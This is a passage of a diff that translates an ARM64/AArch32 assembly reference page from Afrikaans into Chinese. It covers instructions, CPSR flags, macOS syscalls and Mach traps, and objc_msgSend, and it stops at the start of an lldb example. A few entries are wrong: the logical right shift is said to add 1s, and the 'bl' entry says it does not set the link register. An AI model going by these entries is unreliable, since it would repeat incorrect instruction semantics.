-* **`blr`**: **Tak** met Link na Register, gebruik om 'n **subrutine** te **noem** waar die teiken in 'n **register** gespesifiseer is. Stoor die terugadres in `x30`. (Dit is
-* Voorbeeld: `blr x1` — Dit noem die funksie waarvan die adres in `x1` bevat is en stoor die terugadres in `x30`.
-* **`ret`**: **Keer terug** van **subrutine**, tipies met die adres in **`x30`**.
-* Voorbeeld: `ret` — Dit keer terug van die huidige subrutine met die terugadres in `x30`.
-* **`b.<cond>`**: Voorwaardelike takke
-* **`b.eq`**: **Tak as gelyk**, gebaseer op die vorige `cmp` instruksie.
-* Voorbeeld: `b.eq label` — As die vorige `cmp` instruksie twee gelyke waardes gevind het, spring dit na `label`.
-* **`b.ne`**: **Tak as Nie Gelyk**. Hierdie instruksie kyk die toestand vlae (wat deur 'n vorige vergelyking instruksie gestel is), en as die vergelykte waardes nie gelyk was nie, tak dit na 'n etiket of adres.
-* Voorbeeld: Na 'n `cmp x0, x1` instruksie, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
-* **`cbz`**: **Vergelyk en Tak op Nul**. Hierdie instruksie vergelyk 'n register met nul, en as hulle gelyk is, tak dit na 'n etiket of adres.
-* Voorbeeld: `cbz x0, label` — As die waarde in `x0` nul is, spring dit na `label`.
-* **`cbnz`**: **Vergelyk en Tak op Nie-Nul**. Hierdie instruksie vergelyk 'n register met nul, en as hulle nie gelyk is nie, tak dit na 'n etiket of adres.
-* Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie nul is nie, spring dit na `label`.
-* **`tbnz`**: Toets bit en tak op nie-nul
-* Voorbeeld: `tbnz x0, #8, label`
-* **`tbz`**: Toets bit en tak op nul
-* Voorbeeld: `tbz x0, #8, label`
-* **Voorwaardelike seleksie operasies**: Dit is operasies waarvan die gedrag wissel, afhangende van die voorwaardelike bits.
-* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1, as vals, X0 = X2
-* `csinc Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = Xm + 1
-* `cinc Xd, Xn, cond` -> As waar, Xd = Xn + 1, as vals, Xd = Xn
-* `csinv Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = NOT(Xm)
-* `cinv Xd, Xn, cond` -> As waar, Xd = NOT(Xn), as vals, Xd = Xn
-* `csneg Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = - Xm
-* `cneg Xd, Xn, cond` -> As waar, Xd = - Xn, as vals, Xd = Xn
-* `cset Xd, Xn, Xm, cond` -> As waar, Xd = 1, as vals, Xd = 0
-* `csetm Xd, Xn, Xm, cond` -> As waar, Xd = \<alle 1>, as vals, Xd = 0
-* **`adrp`**: Bereken die **blad adres van 'n simbool** en stoor dit in 'n register.
-* Voorbeeld: `adrp x0, symbol` — Dit bereken die blad adres van `symbol` en stoor dit in `x0`.
-* **`ldrsw`**: **Laai** 'n onderteken **32-bit** waarde van geheue en **onderteken-uitbrei dit na 64** bits.
-* Voorbeeld: `ldrsw x0, [x1]` — Dit laai 'n onderteken 32-bit waarde van die geheue ligging wat deur `x1` aangedui word, onderteken-uitbrei dit na 64 bits, en stoor dit in `x0`.
-* **`stur`**: **Stoor 'n register waarde na 'n geheue ligging**, met 'n offset van 'n ander register.
-* Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die geheue adres wat 4 bytes groter is as die adres wat tans in `x1` is.
-* **`svc`** : Maak 'n **stelselaanroep**. Dit staan vir "Supervisor Call". Wanneer die prosessor hierdie instruksie uitvoer, **skakel dit van gebruikersmodus na kernelmodus** en spring na 'n spesifieke ligging in geheue waar die **kernel se stelselaanroep hantering** kode geleë is.
-*   Voorbeeld:
+* **`mov`**：**移动**一个值从一个 **寄存器** 到另一个。
+* 示例：`mov x0, x1` — 这将值从 `x1` 移动到 `x0`。
+* **`ldr`**：**加载**一个值从 **内存** 到 **寄存器**。
+* 示例：`ldr x0, [x1]` — 这将从 `x1` 指向的内存位置加载一个值到 `x0`。
+* **偏移模式**：指示影响原始指针的偏移，例如：
+* `ldr x2, [x1, #8]`，这将加载 `x1 + 8` 的值到 `x2`。
+* `ldr x2, [x0, x1, lsl #2]`，这将从数组 `x0` 中加载一个对象，从位置 `x1`（索引） \* 4。
+* **预索引模式**：这将对原始值应用计算，获取结果并将新原始值存储在原始值中。
+* `ldr x2, [x1, #8]!`，这将加载 `x1 + 8` 到 `x2` 并将结果存储在 `x1` 中。
+* `str lr, [sp, #-4]!`，将链接寄存器存储在 sp 中并更新寄存器 sp。
+* **后索引模式**：这类似于前一个，但内存地址被访问，然后计算并存储偏移。
+* `ldr x0, [x1], #8`，加载 `x1` 到 `x0` 并用 `x1 + 8` 更新 `x1`。
+* **PC 相对寻址**：在这种情况下，加载的地址相对于 PC 寄存器计算。
+* `ldr x1, =_start`，这将加载 `_start` 符号开始的地址到 `x1`，与当前 PC 相关。
+* **`str`**：**存储**一个值从 **寄存器** 到 **内存**。
+* 示例：`str x0, [x1]` — 这将值存储在 `x0` 中到 `x1` 指向的内存位置。
+* **`ldp`**：**加载寄存器对**。此指令 **从连续内存** 位置 **加载两个寄存器**。内存地址通常通过将偏移添加到另一个寄存器的值来形成。
+* 示例：`ldp x0, x1, [x2]` — 这将从 `x2` 和 `x2 + 8` 的内存位置加载 `x0` 和 `x1`。
+* **`stp`**：**存储寄存器对**。此指令 **将两个寄存器存储到** 连续内存位置。内存地址通常通过将偏移添加到另一个寄存器的值来形成。
+* 示例：`stp x0, x1, [sp]` — 这将 `x0` 和 `x1` 存储到 `sp` 和 `sp + 8` 的内存位置。
+* `stp x0, x1, [sp, #16]!` — 这将 `x0` 和 `x1` 存储到 `sp+16` 和 `sp + 24` 的内存位置，并用 `sp+16` 更新 `sp`。
+* **`add`**：**将**两个寄存器的值相加并将结果存储在一个寄存器中。
+* 语法：add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
+* Xn1 -> 目标
+* Xn2 -> 操作数 1
+* Xn3 | #imm -> 操作数 2（寄存器或立即数）
+* \[shift #N | RRX] -> 执行移位或调用 RRX
+* 示例：`add x0, x1, x2` — 这将 `x1` 和 `x2` 中的值相加并将结果存储在 `x0` 中。
+* `add x5, x5, #1, lsl #12` — 这等于 4096（1 左移 12 次） -> 1 0000 0000 0000 0000。
+* **`adds`** 这执行一个 `add` 并更新标志。
+* **`sub`**：**减去**两个寄存器的值并将结果存储在一个寄存器中。
+* 检查 **`add`** **语法**。
+* 示例：`sub x0, x1, x2` — 这将从 `x1` 中减去 `x2` 的值并将结果存储在 `x0` 中。
+* **`subs`** 这类似于减法，但更新标志。
+* **`mul`**：**乘以**两个寄存器的值并将结果存储在一个寄存器中。
+* 示例：`mul x0, x1, x2` — 这将 `x1` 和 `x2` 中的值相乘并将结果存储在 `x0` 中。
+* **`div`**：**将**一个寄存器的值除以另一个并将结果存储在一个寄存器中。
+* 示例：`div x0, x1, x2` — 这将 `x1` 的值除以 `x2` 并将结果存储在 `x0` 中。
+* **`lsl`**、**`lsr`**、**`asr`**、**`ror`, `rrx`**：
+* **逻辑左移**：从末尾添加 0，移动其他位向前（乘以 n 次 2）。
+* **逻辑右移**：在开头添加 1，移动其他位向后（无符号除以 n 次 2）。
+* **算术右移**：类似于 **`lsr`**，但如果最高有效位为 1，则添加 1（有符号除以 n 次 2）。
+* **右旋转**：类似于 **`lsr`**，但从右侧移除的位附加到左侧。
+* **带扩展的右旋转**：类似于 **`ror`**，但将进位标志作为“最高有效位”。因此，进位标志移动到位 31，移除的位移动到进位标志。
+* **`bfm`**：**位域移动**，这些操作 **从一个值复制位 `0...n`** 并将其放置在 **`m..m+n`** 的位置。**`#s`** 指定 **最左边的位** 位置，**`#r`** 指定 **右旋转量**。
+* 位域移动：`BFM Xd, Xn, #r`
+* 有符号位域移动：`SBFM Xd, Xn, #r, #s`
+* 无符号位域移动：`UBFM Xd, Xn, #r, #s`
+* **位域提取和插入**：从一个寄存器复制位域并将其复制到另一个寄存器。
+* **`BFI X1, X2, #3, #4`** 从 X1 的第 3 位插入 X2 的 4 位。
+* **`BFXIL X1, X2, #3, #4`** 从 X2 的第 3 位提取 4 位并复制到 X1。
+* **`SBFIZ X1, X2, #3, #4`** 从 X2 中提取 4 位并插入到 X1，从第 3 位开始，右侧位清零。
+* **`SBFX X1, X2, #3, #4`** 从 X2 的第 3 位提取 4 位，进行符号扩展，并将结果放入 X1。
+* **`UBFIZ X1, X2, #3, #4`** 从 X2 中提取 4 位并插入到 X1，从第 3 位开始，右侧位清零。
+* **`UBFX X1, X2, #3, #4`** 从 X2 的第 3 位提取 4 位并将零扩展的结果放入 X1。
+* **符号扩展到 X**：扩展一个值的符号（或在无符号版本中仅添加 0），以便能够与其执行操作：
+* **`SXTB X1, W2`** 将 W2 的字节符号扩展到 X1（`W2` 是 `X2` 的一半），以填充 64 位。
+* **`SXTH X1, W2`** 将 W2 的 16 位数的符号扩展到 X1，以填充 64 位。
+* **`SXTW X1, W2`** 将 W2 的字节符号扩展到 X1，以填充 64 位。
+* **`UXTB X1, W2`** 将 0（无符号）添加到 W2 的字节中，以填充 64 位。
+* **`extr`**：从指定的 **连接的寄存器对** 中提取位。
+* 示例：`EXTR W3, W2, W1, #3` 这将 **连接 W1+W2** 并获取 **从 W2 的第 3 位到 W1 的第 3 位** 并将其存储在 W3 中。
+* **`cmp`**：**比较**两个寄存器并设置条件标志。它是 **`subs`** 的 **别名**，将目标寄存器设置为零寄存器。用于知道 `m == n`。
+* 它支持 **与 `subs` 相同的语法**。
+* 示例：`cmp x0, x1` — 这将比较 `x0` 和 `x1` 中的值，并相应地设置条件标志。
+* **`cmn`**：**比较负**操作数。在这种情况下，它是 **`adds`** 的 **别名**，并支持相同的语法。用于知道 `m == -n`。
+* **`ccmp`**：条件比较，它是仅在先前比较为真时执行的比较，并将特定设置 nzcv 位。
+* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> 如果 x1 != x2 且 x3 < x4，则跳转到 func。
+* 这是因为 **`ccmp`** 仅在 **先前的 `cmp` 为 `NE`** 时执行，如果不是，则位 `nzcv` 将设置为 0（这不会满足 `blt` 比较）。
+* 这也可以用作 `ccmn`（相同但为负，如 `cmp` 与 `cmn`）。
+* **`tst`**：检查比较的值是否都为 1（它的工作方式类似于不存储结果的 ANDS）。用于检查寄存器与值的比较，并检查寄存器中指示的任何位是否为 1。
+* 示例：`tst X1, #7` 检查 X1 的最后 3 位是否有 1。
+* **`teq`**：XOR 操作，丢弃结果。
+* **`b`**：无条件分支。
+* 示例：`b myFunction`。
+* 注意，这不会用返回地址填充链接寄存器（不适合需要返回的子例程调用）。
+* **`bl`**：**带链接的分支**，用于 **调用** **子例程**。将 **返回地址存储在 `x30`** 中。
+* 示例：`bl myFunction` — 这将调用函数 `myFunction` 并将返回地址存储在 `x30` 中。
+* 注意，这不会用返回地址填充链接寄存器（不适合需要返回的子例程调用）。
+* **`blr`**：**带链接的分支到寄存器**，用于 **调用** **子例程**，目标在 **寄存器** 中 **指定**。将返回地址存储在 `x30` 中。
+* 示例：`blr x1` — 这将调用地址在 `x1` 中的函数，并将返回地址存储在 `x30` 中。
+* **`ret`**：**从子例程返回**，通常使用 **`x30`** 中的地址。
+* 示例：`ret` — 这将使用 `x30` 中的返回地址从当前子例程返回。
+* **`b.<cond>`**：条件分支。
+* **`b.eq`**：**如果相等则分支**，基于先前的 `cmp` 指令。
+* 示例：`b.eq label` — 如果先前的 `cmp` 指令发现两个值相等，则跳转到 `label`。
+* **`b.ne`**：**如果不相等则分支**。此指令检查条件标志（由先前的比较指令设置），如果比较的值不相等，则分支到标签或地址。
+* 示例：在 `cmp x0, x1` 指令之后，`b.ne label` — 如果 `x0` 和 `x1` 中的值不相等，则跳转到 `label`。
+* **`cbz`**：**比较并在零时分支**。此指令将寄存器与零进行比较，如果相等，则分支到标签或地址。
+* 示例：`cbz x0, label` — 如果 `x0` 中的值为零，则跳转到 `label`。
+* **`cbnz`**：**比较并在非零时分支**。此指令将寄存器与零进行比较，如果不相等，则分支到标签或地址。
+* 示例：`cbnz x0, label` — 如果 `x0` 中的值非零，则跳转到 `label`。
+* **`tbnz`**：测试位并在非零时分支。
+* 示例：`tbnz x0, #8, label`。
+* **`tbz`**：测试位并在零时分支。
+* 示例：`tbz x0, #8, label`。
+* **条件选择操作**：这些操作的行为取决于条件位。
+* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 如果为真，X0 = X1，如果为假，X0 = X2。
+* `csinc Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，如果为假，Xd = Xm + 1。
+* `cinc Xd, Xn, cond` -> 如果为真，Xd = Xn + 1，如果为假，Xd = Xn。
+* `csinv Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，如果为假，Xd = NOT(Xm)。
+* `cinv Xd, Xn, cond` -> 如果为真，Xd = NOT(Xn)，如果为假，Xd = Xn。
+* `csneg Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，如果为假，Xd = - Xm。
+* `cneg Xd, Xn, cond` -> 如果为真，Xd = - Xn，如果为假，Xd = Xn。
+* `cset Xd, Xn, Xm, cond` -> 如果为真，Xd = 1，如果为假，Xd = 0。
+* `csetm Xd, Xn, Xm, cond` -> 如果为真，Xd = \<全 1>，如果为假，Xd = 0。
+* **`adrp`**：计算 **符号的页地址** 并将其存储在寄存器中。
+* 示例：`adrp x0, symbol` — 这计算 `symbol` 的页地址并将其存储在 `x0` 中。
+* **`ldrsw`**：**加载**一个有符号 **32 位** 值从内存并 **符号扩展到 64** 位。
+* 示例：`ldrsw x0, [x1]` — 这将从 `x1` 指向的内存位置加载一个有符号 32 位值，符号扩展到 64 位，并存储在 `x0` 中。
+* **`stur`**：**将寄存器值存储到内存位置**，使用来自另一个寄存器的偏移。
+* 示例：`stur x0, [x1, #4]` — 这将值存储在 `x0` 中到比当前在 `x1` 中的地址大 4 字节的内存地址。
+* **`svc`** : 进行 **系统调用**。它代表“监督调用”。当处理器执行此指令时，它 **从用户模式切换到内核模式** 并跳转到内存中 **内核的系统调用处理** 代码所在的特定位置。
+* 示例：
 
 ```armasm
-mov x8, 93  ; Laai die stelselaanroepnommer vir uitgang (93) in register x8.
-mov x0, 0   ; Laai die uitgangstatuskode (0) in register x0.
-svc 0       ; Maak die stelselaanroep.
+mov x8, 93  ; 将退出的系统调用号（93）加载到寄存器 x8 中。
+mov x0, 0   ; 将退出状态代码（0）加载到寄存器 x0 中。
+svc 0       ; 进行系统调用。
 ```
 
-### **Funksie Proloog**
+### **函数序言**
 
-1. **Stoor die link register en raamwyser in die stapel**:
+1. **将链接寄存器和帧指针保存到堆栈**：
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
 {% endcode %}
 
-2. **Stel die nuwe raamwyser op**: `mov x29, sp` (stel die nuwe raamwyser op vir die huidige funksie)
-3. **Toewys ruimte op die stapel vir plaaslike veranderlikes** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal bytes is wat benodig word)
+2. **设置新的帧指针**: `mov x29, sp` (为当前函数设置新的帧指针)
+3. **在栈上为局部变量分配空间（如果需要）**: `sub sp, sp, <size>` (其中 `<size>` 是所需的字节数)
 
-### **Funksie Epiloog**
+### **函数尾声**
 
-1. **Deallocate plaaslike veranderlikes (indien enige toegeken is)**: `add sp, sp, <size>`
-2. **Herstel die skakelregister en raamwyser**:
+1. **释放局部变量（如果有分配的话）**: `add sp, sp, <size>`
+2. **恢复链接寄存器和帧指针**:
+
+{% code overflow="wrap" %}
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
 {% endcode %}
 
-3. **Return**: `ret` (gee beheer terug aan die oproeper met behulp van die adres in die skakelregister)
+3. **返回**: `ret`（使用链接寄存器中的地址将控制权返回给调用者）
 
-## AARCH32 Uitvoeringsstaat
+## AARCH32 执行状态
 
-Armv8-A ondersteun die uitvoering van 32-bis programme. **AArch32** kan in een van **twee instruksiesette** loop: **`A32`** en **`T32`** en kan tussen hulle skakel via **`interworking`**.\
-**Bevoorregte** 64-bis programme kan die **uitvoering van 32-bis** programme skeduleer deur 'n uitsonderingsvlak oordrag na die laer bevoorregte 32-bis uit te voer.\
-Let daarop dat die oorgang van 64-bis na 32-bis plaasvind met 'n verlaging van die uitsonderingsvlak (byvoorbeeld 'n 64-bis program in EL1 wat 'n program in EL0 aktiveer). Dit word gedoen deur die **bit 4 van** **`SPSR_ELx`** spesiale register **na 1** te stel wanneer die `AArch32` prosesdraad gereed is om uitgevoer te word en die res van `SPSR_ELx` stoor die **`AArch32`** programme CPSR. Dan roep die bevoorregte proses die **`ERET`** instruksie aan sodat die verwerker oorgaan na **`AArch32`** wat in A32 of T32 ingaan, afhangende van CPSR\*\*.\*\*
+Armv8-A 支持执行 32 位程序。**AArch32** 可以在 **两种指令集** 中运行：**`A32`** 和 **`T32`**，并可以通过 **`互操作`** 在它们之间切换。\
+**特权** 64 位程序可以通过执行异常级别转移到较低特权的 32 位程序来调度 **32 位** 程序的执行。\
+请注意，从 64 位到 32 位的过渡发生在异常级别降低时（例如，EL1 中的 64 位程序触发 EL0 中的程序）。这是通过在 `AArch32` 进程线程准备执行时将 **`SPSR_ELx`** 特殊寄存器的 **第 4 位** 设置为 **1** 来完成的，其余的 `SPSR_ELx` 存储 **`AArch32`** 程序的 CPSR。然后，特权进程调用 **`ERET`** 指令，以便处理器过渡到 **`AArch32`**，根据 CPSR 进入 A32 或 T32。\*\*
 
-Die **`interworking`** vind plaas met behulp van die J en T bits van CPSR. `J=0` en `T=0` beteken **`A32`** en `J=0` en `T=1` beteken **T32**. Dit beteken basies om die **laagste bit na 1** te stel om aan te dui dat die instruksieset T32 is.\
-Dit word tydens die **interworking takinstruksies** gestel, maar kan ook direk met ander instruksies gestel word wanneer die PC as die bestemmingsregister gestel word. Voorbeeld:
+**`互操作`** 通过 CPSR 的 J 和 T 位发生。`J=0` 和 `T=0` 表示 **`A32`**，而 `J=0` 和 `T=1` 表示 **T32**。这基本上意味着将 **最低位设置为 1** 以指示指令集为 T32。\
+这在 **互操作分支指令** 中设置，但也可以在 PC 设置为目标寄存器时通过其他指令直接设置。示例：
 
-Nog 'n voorbeeld:
+另一个示例：
 ```armasm
 _start:
 .code 32                ; Begin using A32
@@ -279,64 +281,62 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
-### Registers
+### 寄存器
 
-Daar is 16 32-bit registers (r0-r15). **Van r0 tot r14** kan hulle gebruik word vir **enige operasie**, maar sommige daarvan is gewoonlik gereserveer:
+有16个32位寄存器（r0-r15）。**从r0到r14**可以用于**任何操作**，但是其中一些通常是保留的：
 
-* **`r15`**: Programma teller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32, huidige + 4.
-* **`r11`**: Raamwyser
-* **`r12`**: Intra-prosedure oproep register
-* **`r13`**: Stapelwyser
-* **`r14`**: Skakel register
+* **`r15`**：程序计数器（始终）。包含下一条指令的地址。在A32中为当前 + 8，在T32中为当前 + 4。
+* **`r11`**：帧指针
+* **`r12`**：过程内调用寄存器
+* **`r13`**：栈指针
+* **`r14`**：链接寄存器
 
-Boonop word registers gebackup in **`banked registries`**. Dit is plekke wat die registerwaardes stoor wat dit moontlik maak om **vinnige kontekstuswisseling** in uitsondering hantering en bevoorregte operasies uit te voer om die behoefte om registers elke keer handmatig te stoor en te herstel te vermy.\
-Dit word gedoen deur **die verwerker toestand van die `CPSR` na die `SPSR`** van die verwerker modus waarheen die uitsondering geneem word, te stoor. By die uitsondering terugkeer, word die **`CPSR`** van die **`SPSR`** herstel.
+此外，寄存器在**`银行寄存器`**中备份。这些是存储寄存器值的地方，允许在异常处理和特权操作中执行**快速上下文切换**，以避免每次都手动保存和恢复寄存器。\
+这是通过**将处理器状态从`CPSR`保存到处理器模式的`SPSR`**来完成的。在异常返回时，**`CPSR`**从**`SPSR`**恢复。
 
-### CPSR - Huidige Program Status Register
+### CPSR - 当前程序状态寄存器
 
-In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word ook gestoor in **`SPSR_ELx`** wanneer 'n uitsondering geneem word om later die uitvoering te herstel:
+在AArch32中，CPSR的工作方式类似于**`PSTATE`**在AArch64中，并且在发生异常时也存储在**`SPSR_ELx`**中，以便稍后恢复执行：
 
 <figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-Die velde is in 'n paar groepe verdeel:
+字段分为几个组：
 
-* Aansoek Program Status Register (APSR): Aritmetiese vlae en toeganklik vanaf EL0
-* Uitvoeringsstaat Registers: Proses gedrag (geadministreer deur die OS).
+* 应用程序状态寄存器（APSR）：算术标志，并可从EL0访问
+* 执行状态寄存器：进程行为（由操作系统管理）。
 
-#### Aansoek Program Status Register (APSR)
+#### 应用程序状态寄存器（APSR）
 
-* Die **`N`**, **`Z`**, **`C`**, **`V`** vlae (net soos in AArch64)
-* Die **`Q`** vlag: Dit word op 1 gestel wanneer **heelgetal saturasie plaasvind** tydens die uitvoering van 'n gespesialiseerde saturerende aritmetiese instruksie. Sodra dit op **`1`** gestel is, sal dit die waarde behou totdat dit handmatig op 0 gestel word. Boonop is daar geen instruksie wat sy waarde implisiet nagaan nie, dit moet gedoen word deur dit handmatig te lees.
-*   **`GE`** (Groter as of gelyk aan) Vlaggies: Dit word gebruik in SIMD (Enkele Instruksie, Meervoudige Data) operasies, soos "parallel byvoeg" en "parallel aftrek". Hierdie operasies stel in staat om verskeie datapunte in 'n enkele instruksie te verwerk.
+* **`N`**、**`Z`**、**`C`**、**`V`** 标志（与AArch64相同）
+* **`Q`** 标志：在执行专用饱和算术指令期间，每当**整数饱和发生**时设置为1。一旦设置为**`1`**，它将保持该值，直到手动设置为0。此外，没有任何指令隐式检查其值，必须手动读取。
+* **`GE`**（大于或等于）标志：用于SIMD（单指令，多数据）操作，例如“并行加法”和“并行减法”。这些操作允许在单个指令中处理多个数据点。
 
-Byvoorbeeld, die **`UADD8`** instruksie **voeg vier pare bytes** (van twee 32-bit operand) parallel by en stoor die resultate in 'n 32-bit register. Dit stel dan **die `GE` vlae in die `APSR`** op grond van hierdie resultate. Elke GE vlag kom ooreen met een van die byte byvoegings, wat aandui of die byvoeging vir daardie byte paar **oorloop**.
+例如，**`UADD8`** 指令**并行添加四对字节**（来自两个32位操作数），并将结果存储在32位寄存器中。然后**根据这些结果设置`GE`标志在`APSR`中**。每个GE标志对应于一个字节加法，指示该字节对的加法是否**溢出**。
 
-Die **`SEL`** instruksie gebruik hierdie GE vlae om voorwaardelike aksies uit te voer.
+**`SEL`** 指令使用这些GE标志执行条件操作。
 
-#### Uitvoeringsstaat Registers
+#### 执行状态寄存器
 
-* Die **`J`** en **`T`** bits: **`J`** moet 0 wees en as **`T`** 0 is, word die instruksieset A32 gebruik, en as dit 1 is, word die T32 gebruik.
-* **IT Blok Staat Register** (`ITSTATE`): Dit is die bits van 10-15 en 25-26. Hulle stoor toestande vir instruksies binne 'n **`IT`** voorvoegsel groep.
-* **`E`** bit: Dui die **endianness** aan.
-* **Modus en Uitsondering Masker Bits** (0-4): Hulle bepaal die huidige uitvoeringsstaat. Die **5de** dui aan of die program as 32bit (n 1) of 64bit (n 0) loop. Die ander 4 verteenwoordig die **uitsondering modus wat tans gebruik word** (wanneer 'n uitsondering plaasvind en dit hanteer word). Die nommer wat gestel word **dui die huidige prioriteit aan** in die geval dat 'n ander uitsondering geaktiveer word terwyl dit hanteer word.
+* **`J`** 和 **`T`** 位：**`J`** 应为0，如果 **`T`** 为0，则使用指令集A32，如果为1，则使用T32。
+* **IT块状态寄存器**（`ITSTATE`）：这些是从10-15和25-26的位。它们存储**`IT`**前缀组内指令的条件。
+* **`E`** 位：指示**字节序**。
+* **模式和异常掩码位**（0-4）：它们确定当前执行状态。**第5位**指示程序以32位（1）或64位（0）运行。其他4位表示**当前使用的异常模式**（当发生异常并正在处理时）。设置的数字**指示当前优先级**，以防在处理此异常时触发另一个异常。
 
 <figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-* **`AIF`**: Sekere uitsonderings kan gedeaktiveer word deur die bits **`A`**, `I`, `F`. As **`A`** 1 is, beteken dit dat **asynchrone aborts** geaktiveer sal word. Die **`I`** stel in om te reageer op eksterne hardeware **Interrupts Requests** (IRQs). en die F is verwant aan **Fast Interrupt Requests** (FIRs).
+* **`AIF`**：某些异常可以使用位**`A`**、`I`、`F`禁用。如果**`A`**为1，则表示将触发**异步中止**。**`I`**配置为响应外部硬件**中断请求**（IRQ）。F与**快速中断请求**（FIR）相关。
 
 ## macOS
 
-### BSD syscalls
+### BSD系统调用
 
-Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls sal **x16 > 0** hê.
+查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD系统调用将具有**x16 > 0**。
 
-### Mach Traps
+### Mach陷阱
 
-Kyk na [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) die `mach_trap_table` en in [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) die prototipes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, so jy moet die nommers van die vorige lys met 'n **minus** aanroep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
+查看[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)中的`mach_trap_table`，以及在[**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)中的原型。Mach陷阱的最大数量为`MACH_TRAP_TABLE_COUNT` = 128。Mach陷阱将具有**x16 < 0**，因此您需要用**负号**调用前一个列表中的数字：**`_kernelrpc_mach_vm_allocate_trap`**是**`-10`**。
 
-Jy kan ook **`libsystem_kernel.dylib`** in 'n disassembler nagaan om te vind hoe om hierdie (en BSD) syscalls aan te roep:
-
-{% code overflow="wrap" %}
+您还可以在反汇编器中检查**`libsystem_kernel.dylib`**以找到如何调用这些（和BSD）系统调用：
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -346,33 +346,33 @@ dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shar
 ```
 {% endcode %}
 
-Let daarop dat **Ida** en **Ghidra** ook **spesifieke dylibs** uit die cache kan dekompileer net deur die cache te oorhandig.
+注意，**Ida** 和 **Ghidra** 也可以通过传递缓存来反编译 **特定的 dylibs**。
 
 {% hint style="success" %}
-Soms is dit makliker om die **gedekompleerde** kode van **`libsystem_kernel.dylib`** te kontroleer **as** om die **bronkode** te kontroleer omdat die kode van verskeie syscalls (BSD en Mach) via skripte gegenereer word (kyk kommentaar in die bronkode) terwyl jy in die dylib kan vind wat aangeroep word.
+有时检查 **`libsystem_kernel.dylib`** 的 **反编译** 代码比检查 **源代码** 更容易，因为几个系统调用（BSD 和 Mach）的代码是通过脚本生成的（查看源代码中的注释），而在 dylib 中你可以找到被调用的内容。
 {% endhint %}
 
-### machdep oproepe
+### machdep 调用
 
-XNU ondersteun 'n ander tipe oproepe wat masjienafhanklik genoem word. Die getalle van hierdie oproepe hang af van die argitektuur en geen van die oproepe of getalle is gewaarborg om konstant te bly nie.
+XNU 支持另一种称为机器依赖的调用。这些调用的数量取决于架构，且调用或数量都不保证保持不变。
 
-### comm bladsy
+### comm 页面
 
-Dit is 'n kern eienaar geheue bladsy wat in die adresruimte van elke gebruiker se proses gemap is. Dit is bedoel om die oorgang van gebruikersmodus na kernruimte vinniger te maak as om syscalls te gebruik vir kern dienste wat so baie gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.
+这是一个内核拥有的内存页面，映射到每个用户进程的地址空间中。它旨在使从用户模式到内核空间的转换比使用系统调用更快，因为这些内核服务的使用频率很高，这样的转换会非常低效。
 
-Byvoorbeeld, die oproep `gettimeofdate` lees die waarde van `timeval` direk van die comm bladsy.
+例如，调用 `gettimeofdate` 直接从 comm 页面读取 `timeval` 的值。
 
 ### objc\_msgSend
 
-Dit is baie algemeen om hierdie funksie in Objective-C of Swift programme te vind. Hierdie funksie stel jou in staat om 'n metode van 'n Objective-C objek aan te roep.
+在 Objective-C 或 Swift 程序中，找到这个函数是非常常见的。这个函数允许调用一个 Objective-C 对象的方法。
 
-Parameters ([meer inligting in die dokumentasie](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):
+参数（[文档中更多信息](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)）：
 
-* x0: self -> Wys na die instansie
-* x1: op -> Selektor van die metode
-* x2... -> Res van die argumente van die aangeroepte metode
+* x0: self -> 指向实例的指针
+* x1: op -> 方法的选择器
+* x2... -> 被调用方法的其余参数
 
-So, as jy 'n breekpunt voor die tak na hierdie funksie plaas, kan jy maklik vind wat in lldb aangeroep word (in hierdie voorbeeld roep die objek 'n objek van `NSConcreteTask` aan wat 'n opdrag sal uitvoer):
+因此，如果在调用此函数的分支之前设置断点，你可以很容易地在 lldb 中找到被调用的内容（在这个例子中，对象调用了一个来自 `NSConcreteTask` 的对象，该对象将运行一个命令）：
 ```bash
 # Right in the line were objc_msgSend will be called
